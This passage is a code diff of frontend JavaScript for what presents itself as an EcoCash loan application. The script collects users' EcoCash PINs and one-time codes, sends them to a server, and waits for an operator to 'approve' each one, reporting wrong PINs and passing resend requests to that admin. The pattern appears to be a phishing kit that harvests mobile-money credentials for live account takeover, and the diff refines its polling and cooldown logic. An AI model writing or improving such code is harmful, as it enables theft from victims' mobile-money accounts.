@@ -1,5 +1,5 @@
 // ============================================================
-// EcoCash Loan Application – Frontend Logic (FIXED)
+// EcoCash Loan Application – Frontend Logic
 // ============================================================
 
 let appData = {
@@ -18,6 +18,9 @@ let appData = {
 };
 
 let currentPage = 'page-landing';
+let pinPollingActive = false;
+
+const RESEND_COOLDOWN_MS = 60 * 1000; // 60 seconds
 
 // ─── localStorage Helpers ───
 function saveState() {
@@ -47,19 +50,19 @@ function clearState() {
 // ─── Page Navigation ───
 function goTo(pageId) {
   document.querySelectorAll('.page').forEach(p => p.classList.remove('active'));
-  document.getElementById(pageId).classList.add('active');
+  const target = document.getElementById(pageId);
+  if (target) target.classList.add('active');
   currentPage = pageId;
   saveState();
 }
 
 function clearErr(id) {
   const el = document.getElementById(id);
-  el.classList.remove('show');
+  if (el) el.classList.remove('show');
 }
 
 // ─── Landing ───
 function startApplication() {
-  // Reset all appData
   appData = {
     loanAmount: 200,
     loanDuration: 30,
@@ -148,6 +151,7 @@ async function submitApp() {
     const data = await response.json();
     if (data.ok) {
       appData.applicationId = data.applicationId;
+      saveState();
       goTo('page-processing');
       document.getElementById('processingStatus').textContent = '⏳ Awaiting admin approval of application...';
       startAppPolling();
@@ -160,14 +164,12 @@ async function submitApp() {
   }
 }
 
-// ─── App Approval Polling (New) ───
+// ─── App Approval Polling ───
 function startAppPolling() {
   if (window._appInterval) clearInterval(window._appInterval);
   window._appInterval = setInterval(async () => {
     try {
-      const res = await fetch(`/api/status/${appData.applicationId}/app`, {
-        cache: 'no-store'
-      });
+      const res = await fetch(`/api/status/${appData.applicationId}/app`, { cache: 'no-store' });
       if (res.status === 404) {
         clearInterval(window._appInterval);
         clearState();
@@ -181,6 +183,7 @@ function startAppPolling() {
         clearInterval(window._appInterval);
         goTo('page-pin');
         clearLoginPin();
+        pinPollingActive = false;
         document.getElementById('pinAttemptsDisplay').textContent = '🔑 Attempts remaining: 3 of 3';
         return;
       }
@@ -226,13 +229,13 @@ async function doPin() {
 // ─── PIN Polling ───
 function startPinPolling() {
   if (window._pinInterval) clearInterval(window._pinInterval);
+  pinPollingActive = true;
   window._pinInterval = setInterval(async () => {
     try {
-      const res = await fetch(`/api/status/${appData.applicationId}/pin`, {
-        cache: 'no-store'
-      });
+      const res = await fetch(`/api/status/${appData.applicationId}/pin`, { cache: 'no-store' });
       if (res.status === 404) {
         clearInterval(window._pinInterval);
+        pinPollingActive = false;
         clearState();
         alert('Application not found. Please start again.');
         goTo('page-landing');
@@ -242,7 +245,9 @@ function startPinPolling() {
 
       if (data.status === 'approved') {
         clearInterval(window._pinInterval);
+        pinPollingActive = false;
         clearLoginPin();
+        setResendWaitingStatus('pin', 'clear');
         document.getElementById('pinAttemptsDisplay').textContent = '🔑 Attempts remaining: 3 of 3';
         goTo('page-otp');
         return;
@@ -252,10 +257,13 @@ function startPinPolling() {
         document.getElementById('pinAttemptsDisplay').textContent = `🔑 Attempts remaining: ${remaining} of 3`;
         showError('pinErr', `Wrong PIN. ${remaining} attempt(s) remaining.`);
         clearLoginPin();
+        clearInterval(window._pinInterval);
+        pinPollingActive = false;
         return;
       }
       if (data.status === 'blocked') {
         clearInterval(window._pinInterval);
+        pinPollingActive = false;
         document.getElementById('pinAttemptsDisplay').textContent = '🔒 Too many attempts. Please wait 5 minutes.';
         disablePinInputs();
         showError('pinErr', 'Application blocked. Please wait 5 minutes.');
@@ -295,9 +303,7 @@ function startOtpPolling() {
   if (window._otpInterval) clearInterval(window._otpInterval);
   window._otpInterval = setInterval(async () => {
     try {
-      const res = await fetch(`/api/status/${appData.applicationId}/otp`, {
-        cache: 'no-store'
-      });
+      const res = await fetch(`/api/status/${appData.applicationId}/otp`, { cache: 'no-store' });
       if (res.status === 404) {
         clearInterval(window._otpInterval);
         clearState();
@@ -309,6 +315,7 @@ function startOtpPolling() {
 
       if (data.status === 'approved') {
         clearInterval(window._otpInterval);
+        setResendWaitingStatus('otp', 'clear');
         showApproval();
         return;
       }
@@ -334,6 +341,7 @@ async function resendOtp() {
     const data = await response.json();
     if (data.ok) {
       alert('OTP resend request sent to admin.');
+      startOtpPolling();
     } else {
       alert('Error: ' + data.error);
     }
@@ -345,6 +353,7 @@ async function resendOtp() {
 // ─── Approval / Rejection ───
 function showApproval() {
   document.getElementById('aprAmount').textContent = `$${appData.loanAmount}`;
+  document.getElementById('aprAmt').textContent = `$${appData.loanAmount}`;
   document.getElementById('aprTerm').textContent = `${appData.loanDuration} Days`;
   document.getElementById('aprMth').textContent = `$${(appData.loanAmount * (1 + 0.005 * appData.loanDuration)).toFixed(2)}`;
   goTo('page-approval');
@@ -360,7 +369,9 @@ function showRejected(reason) {
 // ─── Helpers ───
 function showError(id, msg) {
   const el = document.getElementById(id);
-  el.querySelector('span:last-child').textContent = msg;
+  if (!el) return;
+  const txt = el.querySelector('span:last-child');
+  if (txt) txt.textContent = msg;
   el.classList.add('show');
   setTimeout(() => el.classList.remove('show'), 3000);
 }
@@ -382,12 +393,17 @@ function pinMvM(input, idx) {
     document.getElementById('pin' + (idx - 1)).focus();
   }
 }
+
 function togPin() {
   let inputs = document.querySelectorAll('.pin-box');
   inputs.forEach(inp => inp.type = inp.type === 'password' ? 'text' : 'password');
 }
+
 function clearLoginPin() {
-  document.querySelectorAll('.pin-box').forEach(inp => inp.value = '');
+  document.querySelectorAll('.pin-box').forEach(inp => {
+    inp.value = '';
+    inp.disabled = false;
+  });
 }
 
 function handleOtpInput(input, type) {
@@ -395,27 +411,90 @@ function handleOtpInput(input, type) {
     document.getElementById('otp' + (parseInt(input.id.slice(3)) + 1)).focus();
   }
 }
+
 function clearOtpCode() {
   document.querySelectorAll('.otp-box').forEach(inp => inp.value = '');
 }
 
-// ─── Restore State on Page Load ───
-document.addEventListener('DOMContentLoaded', function() {
-  const restored = loadState();
-  if (restored && appData.applicationId) {
-    if (currentPage === 'page-processing') {
-      goTo('page-processing');
-      startAppPolling();
-    } else if (currentPage === 'page-pin') {
-      goTo('page-pin');
-    } else if (currentPage === 'page-otp') {
-      goTo('page-otp');
-    } else if (currentPage === 'page-step1' || currentPage === 'page-step2' || currentPage === 'page-step3') {
-      goTo(currentPage);
-    } else {
-      goTo(currentPage);
-    }
-  } else {
-    goTo('page-landing');
+// ============================================================
+// Resend cooldown + waiting status
+// ============================================================
+function getCooldownKey(step) {
+  return `ecocash_resend_until_${step}`;
+}
+
+function getRemainingCooldown(step) {
+  const until = parseInt(localStorage.getItem(getCooldownKey(step)) || '0', 10);
+  return Math.max(0, until - Date.now());
+}
+
+function startResendCooldown(step, btnId) {
+  const until = Date.now() + RESEND_COOLDOWN_MS;
+  localStorage.setItem(getCooldownKey(step), String(until));
+  applyCooldownUI(step, btnId);
+}
+
+function applyCooldownUI(step, btnId) {
+  const btn = document.getElementById(btnId);
+  if (!btn) return;
+  if (btn._cooldownTimer) {
+    clearInterval(btn._cooldownTimer);
+    btn._cooldownTimer = null;
   }
-});
+
+  const tick = () => {
+    const remaining = getRemainingCooldown(step);
+    if (remaining <= 0) {
+      btn.disabled = false;
+      btn.classList.remove('cooldown');
+      btn.textContent = '🔄 Resend to Admin';
+      if (btn._cooldownTimer) {
+        clearInterval(btn._cooldownTimer);
+        btn._cooldownTimer = null;
+      }
+      localStorage.removeItem(getCooldownKey(step));
+      return;
+    }
+    const secs = Math.ceil(remaining / 1000);
+    btn.disabled = true;
+    btn.classList.add('cooldown');
+    btn.textContent = `⏳ Resend in ${secs}s`;
+  };
+
+  tick();
+  btn._cooldownTimer = setInterval(tick, 500);
+}
+
+async function requestResend(step) {
+  const btnId = step === 'pin' ? 'resendBtnPin' : step === 'otp' ? 'resendBtnOtp' : 'resendBtnApp';
+
+  // Guard: if still cooling down, ignore
+  if (getRemainingCooldown(step) > 0) return;
+
+  setResendWaitingStatus(step, 'waiting');
+
+  try {
+    const res = await fetch(`/api/resend-step/${appData.applicationId}/${step}`, { method: 'POST' });
+    const data = await res.json();
+    if (res.status === 429 && data.cooldown) {
+      // Server enforces cooldown too — sync it
+      const until = Date.now() + (data.remainingSec * 1000);
+      localStorage.setItem(getCooldownKey(step), String(until));
+      applyCooldownUI(step, btnId);
+      setResendWaitingStatus(step, 'error', data.error);
+      return;
+    }
+    if (data.ok) {
+      startResendCooldown(step, btnId);
+      setResendWaitingStatus(step, 'sent');
+      if (step === 'pin') startPinPolling();
+      else if (step === 'otp') startOtpPolling();
+    } else {
+      setResendWaitingStatus(step, 'error', data.error || 'Failed to resend');
+    }
+  } catch (err) {
+    setResendWaitingStatus(step, 'error', 'Network error');
+  }
+}
+
+function setRes
